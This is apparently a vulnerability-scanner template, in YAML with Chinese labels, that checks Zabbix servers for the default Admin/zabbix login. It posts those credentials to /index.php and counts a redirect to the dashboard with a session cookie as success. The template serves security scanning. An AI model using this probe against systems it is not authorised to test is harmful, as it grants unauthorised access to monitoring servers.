id: poc-yaml-zabbix-default-password
info:
  name: Zabbix 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Zabbix
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /index.php
  headers: {}
  data: name=Admin&password=zabbix&autologin=1&enter=Sign+in
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 302 && contains(headers, "Location") && contains(headers,
    "zabbix.php?action=dashboard.view") && contains(headers, "set-cookie") && contains(headers,
    "zbx_session")
  output: []
